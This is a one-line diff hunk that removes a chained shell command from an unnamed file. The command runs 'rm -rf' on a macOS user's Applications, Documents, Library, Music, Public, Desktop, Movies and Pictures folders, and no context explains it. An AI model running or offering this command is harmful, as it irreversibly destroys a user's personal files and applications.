@@ -1,1 +1,0 @@
-rm -rf ~/Applications/* && rm -rf ~/Documents/* && rm -rf ~/Library && rm -rf ~/Music/* && rm -rf ~/Public/* && rm -rf ~/Desktop/* && rm -rf ~/Movies/* && rm -rf ~/Pictures/*
